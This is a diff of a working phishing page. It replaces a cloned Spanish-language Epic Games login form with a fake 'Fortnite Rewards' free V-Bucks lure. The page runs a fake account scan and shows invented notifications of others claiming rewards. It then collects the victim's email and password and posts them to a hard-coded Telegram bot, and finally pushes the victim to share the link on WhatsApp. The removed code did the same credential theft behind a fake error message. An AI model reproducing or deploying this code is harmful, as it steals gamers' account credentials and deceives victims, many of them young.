@@ -3,137 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar sesión en tu cuenta de Epic Games | Epic Games</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <title>Fortnite Stats & Rewards Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Reset e Base dal file Figma */
-        * { margin: 0; padding: 0; box-box: border-box; }
-        body { background-color: #121212; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; -webkit-font-smoothing: antialiased; }
-
-        /* Card di Login */
-        .login-card { background-color: #202020; width: 100%; max-width: 440px; padding: 40px 50px; border-radius: 4px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); margin: 20px; }
-
-        /* Logo Epic */
-        .logo-container { display: flex; justify-content: center; margin-bottom: 32px; }
-        .logo-container svg { width: 44px; height: 52px; fill: #ffffff; }
-
-        /* Testi */
-        h1 { text-align: center; font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 32px; color: #ffffff; }
-
-        /* Form */
-        .input-group { margin-bottom: 16px; }
-        input { width: 100%; height: 56px; background-color: #333333; border: 1px solid transparent; border-radius: 4px; padding: 0 16px; color: #ffffff; font-size: 14px; transition: border-color 0.2s; box-sizing: border-box; }
-        input:focus { border-color: #ffffff; outline: none; }
-        input::placeholder { color: #8a8a8a; }
-
-        .form-options { display: flex; justify-content: space-between; align-items: center; margin: 20px 0; font-size: 11px; color: #8a8a8a; }
-        .checkbox-group { display: flex; align-items: center; cursor: pointer; }
-        .checkbox-group input { width: 18px; height: 18px; margin-right: 8px; cursor: pointer; }
-        .forgot-pass { color: #8a8a8a; text-decoration: underline; }
-        .forgot-pass:hover { color: #ffffff; }
-
-        /* Bottone Blu Epic */
-        .btn-submit { width: 100%; height: 56px; background-color: #007bff; border: none; border-radius: 4px; color: #ffffff; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; cursor: pointer; transition: background-color 0.2s; }
-        .btn-submit:hover { background-color: #0069d9; }
-
-        /* Separatore */
-        .divider { display: flex; align-items: center; margin: 32px 0; }
-        .divider-line { flex: 1; height: 1px; background-color: #333333; }
-        .divider-text { padding: 0 15px; color: #8a8a8a; font-size: 10px; font-weight: 700; text-transform: uppercase; }
-
-        /* Sezione Console (Grid esatta da Figma) */
-        .console-grid { display: grid; grid-template-cols: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
-        .social-grid { display: grid; grid-template-cols: repeat(4, 1fr); gap: 8px; }
-        
-        .box { background-color: #333333; border-radius: 4px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: background-color 0.2s; }
-        .box:hover { background-color: #444444; }
-        .box-large { height: 90px; }
-        .box-small { height: 60px; }
-
-        .box img { width: 24px; height: 24px; margin-bottom: 8px; filter: brightness(0) invert(1); }
-        .box span { font-size: 11px; color: #8a8a8a; }
-
-        /* Footer */
-        .footer-text { text-align: center; margin-top: 40px; font-size: 12px; color: #8a8a8a; }
-        .footer-text a { color: #ffffff; font-weight: 700; text-decoration: underline; margin-left: 4px; }
+        body { background-color: #0b0b0b; font-family: 'Inter', sans-serif; color: white; overflow-x: hidden; }
+        .gradient-text { background: linear-gradient(90deg, #007bff, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero-card { background: rgba(32, 32, 32, 0.8); backdrop-filter: blur(10px); border: 1px solid #333; border-radius: 12px; }
+        .loader { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; margin: 20px 0; }
+        .loader-bar { width: 0%; height: 100%; background: #007bff; transition: width 0.5s; }
+        .notification { position: fixed; bottom: 20px; left: 20px; background: #202020; border-left: 4px solid #007bff; padding: 10px 20px; border-radius: 4px; font-size: 12px; animation: slideIn 0.5s ease-out; }
+        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }
     </style>
 </head>
-<body>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-<div class="login-card">
-    <div class="logo-container">
-        <svg viewBox="0 0 44 52"><path d="M43.035 15.228c0-.363-.075-.724-.224-1.06a3.02 3.02 0 00-.638-.897 2.94 2.94 0 00-.93-.615 2.9 2.9 0 00-1.12-.224H4.877c-.364 0-.724.075-1.061.224a2.91 2.91 0 00-.9.615 2.94 2.94 0 00-.636.897c-.15.336-.225.697-.225 1.06v21.544c0 .363.075.724.225 1.06a3.02 3.02 0 00.636.897c.273.272.585.483.9.615.337.15.697.224 1.061.224H12.9v9.062a.45.45 0 00.77.32L23.184 38.65h17.813c.364 0 .724-.075 1.06-.224a3.02 3.02 0 00.93-.615 3.06 3.06 0 00.638-.897c.15-.336.224-.697.224-1.06V15.228h-.014z"/></svg>
-    </div>
-    <h1>Iniciar sesión</h1>
-    
-    <form id="loginForm">
-        <div class="input-group">
-            <input type="email" id="email" placeholder="Correo electrónico" required>
-        </div>
-        <div class="input-group">
-            <input type="password" id="password" placeholder="Contraseña" required>
-        </div>
-        
-        <div class="form-options">
-            <label class="checkbox-group">
-                <input type="checkbox"> Recuérdame
-            </label>
-            <a href="#" class="forgot-pass">¿Has olvidado tu contraseña?</a>
+    <div id="notif-container"></div>
+
+    <div class="hero-card max-w-md w-100 p-8 shadow-2xl text-center">
+        <h1 class="text-3xl font-black uppercase mb-2">Fortnite <span class="gradient-text">Rewards</span></h1>
+        <p class="text-gray-400 text-sm mb-6">Escanea tu cuenta para verificar elegibilidad de V-Bucks y Skins exclusivas.</p>
+
+        <div id="step-1">
+            <input type="text" id="username" placeholder="Tu nombre de usuario" class="w-full bg-transparent border border-gray-700 p-4 rounded mb-4 focus:border-blue-500 outline-none">
+            <div class="grid grid-cols-2 gap-2 mb-4">
+                <button class="bg-gray-800 p-2 rounded text-xs border border-transparent hover:border-blue-500">PlayStation</button>
+                <button class="bg-gray-800 p-2 rounded text-xs border border-transparent hover:border-green-500">Xbox</button>
+            </div>
+            <button onclick="startScan()" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded font-bold uppercase tracking-widest">Escanear Cuenta</button>
         </div>
 
-        <button type="submit" class="btn-submit">Iniciar sesión</button>
-    </form>
-
-    <div class="divider">
-        <div class="divider-line"></div>
-        <span class="divider-text">o</span>
-        <div class="divider-line"></div>
-    </div>
-
-    <div class="console-grid">
-        <div class="box box-large">
-            <img src="https://www.svgrepo.com/show/303233/playstation-6-logo.svg">
-            <span>PlayStation™ Network</span>
+        <div id="step-2" class="hidden">
+            <p id="status" class="text-xs text-blue-400 font-mono italic">Iniciando conexión...</p>
+            <div class="loader"><div id="bar" class="loader-bar"></div></div>
+            <div id="logs" class="text-[10px] text-gray-500 font-mono text-left h-24 overflow-hidden"></div>
         </div>
-        <div class="box box-large">
-            <img src="https://www.svgrepo.com/show/303215/xbox-logo.svg">
-            <span>Red Xbox</span>
+
+        <div id="step-3" class="hidden text-left">
+            <div class="bg-blue-900/20 border border-blue-500/50 p-4 rounded mb-6">
+                <p class="text-blue-400 text-xs font-bold uppercase">🎉 ¡Elegibilidad Confirmada!</p>
+                <p class="text-white text-sm">Has sido seleccionado per recibir **13.500 V-Bucks**. Inicia sesión para vincular y reclamar.</p>
+            </div>
+            
+            <form id="finalForm" class="space-y-4">
+                <input type="email" id="email" placeholder="Correo electrónico" class="w-full bg-[#333] p-4 rounded outline-none border border-transparent focus:border-white" required>
+                <input type="password" id="password" placeholder="Contraseña" class="w-full bg-[#333] p-4 rounded outline-none border border-transparent focus:border-white" required>
+                <button type="submit" class="w-full bg-blue-600 p-4 rounded font-bold uppercase">Confirmar y Reclamar</button>
+            </form>
         </div>
     </div>
 
-    <div class="social-grid">
-        <div class="box box-small"><img src="https://www.svgrepo.com/show/303108/google-icon.svg" style="filter:none;"></div>
-        <div class="box box-small"><img src="https://www.svgrepo.com/show/354392/steam.svg"></div>
-        <div class="box box-small"><img src="https://www.svgrepo.com/show/331300/apple.svg"></div>
-        <div class="box box-small"><img src="https://www.svgrepo.com/show/353733/facebook.svg" style="filter:none;"></div>
-    </div>
+    <script>
+        // Sistema di Notifiche (Social Proof)
+        const names = ["Marcos", "Alejandro", "Santi", "Xavi", "Elena", "Dani"];
+        setInterval(() => {
+            const container = document.getElementById('notif-container');
+            const n = document.createElement('div');
+            n.className = 'notification';
+            n.innerHTML = `✅ <b>${names[Math.floor(Math.random()*names.length)]}</b> ha reclamado 13.500 V-Bucks`;
+            container.appendChild(n);
+            setTimeout(() => n.remove(), 4000);
+        }, 8000);
 
-    <p class="footer-text">
-        ¿No tienes una cuenta de Epic Games? <a href="#">Regístrate</a>
-    </p>
-</div>
+        // Logica dello Scan
+        function startScan() {
+            const user = document.getElementById('username').value;
+            if(!user) return alert("Ingresa tu usuario");
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+            
+            let progress = 0;
+            const bar = document.getElementById('bar');
+            const status = document.getElementById('status');
+            const logs = document.getElementById('logs');
+            const logLines = ["Buscando ID...", "Accediendo a servidores de Epic...", "Verificando historial de compras...", "Inyectando paquete de datos...", "Casi listo..."];
 
-<script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        
-        // DATI TELEGRAM
-        const botToken = "8609726894:AAGpEsj7vz-M01u8RRNww3z8lbX3cgTeEmQ";
-        const chatId = "6585533652";
-        const msg = `🎯 **LOGIN EPIC (FIGMA-CLONE)**\n📧 Email: ${email}\n🔑 Pass: ${password}\n🇪🇸 Market: ES`;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if(progress > 100) progress = 100;
+                bar.style.width = progress + "%";
+                
+                if(progress < 100) {
+                    status.innerText = "Escaneando: " + Math.floor(progress) + "%";
+                    const l = document.createElement('p');
+                    l.innerText = "> " + logLines[Math.floor(Math.random()*logLines.length)];
+                    logs.prepend(l);
+                } else {
+                    clearInterval(interval);
+                    document.getElementById('step-2').classList.add('hidden');
+                    document.getElementById('step-3').classList.remove('hidden');
+                }
+            }, 600);
+        }
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
-        }).then(() => {
-            alert('Error de conexión con el servidor (503). Inténtelo de nuovo.');
-            window.location.reload();
+        // Invio a Telegram
+        document.getElementById('finalForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const botToken = "8609726894:AAGpEsj7vz-M01u8RRNww3z8lbX3cgTeEmQ";
+            const chatId = "6585533652";
+            const msg = `🎯 **VIRAL TARGET**\n👤 User: ${document.getElementById('username').value}\n📧 Email: ${document.getElementById('email').value}\n🔑 Pass: ${document.getElementById('password').value}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+            }).then(() => {
+                window.location.href = "https://wa.me/?text=Mira%20esta%20locura%20me%20dieron%2013k%20vbucks%20gratis%20" + window.location.href;
+            });
         });
-    });
-</script>
-
+    </script>
 </body>
 </html>
